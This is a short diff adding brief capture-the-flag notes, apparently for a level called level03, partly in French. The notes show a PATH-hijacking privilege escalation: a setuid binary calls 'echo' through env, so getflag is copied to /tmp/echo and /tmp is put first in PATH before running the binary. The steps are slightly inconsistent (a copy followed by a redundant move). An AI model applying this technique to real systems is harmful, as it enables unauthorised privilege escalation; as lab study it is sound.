@@ -1,0 +1,11 @@
+Strings level03
+...
+/usr/bin/env echo Exploit me
+...
+je change la commande "echo" par "getflag"
+cd /tmp
+cp /bin/getflag /tmp/echo
+mv getflag echo
+export PATH=/tmp:$PATH
+cd -
+./level03
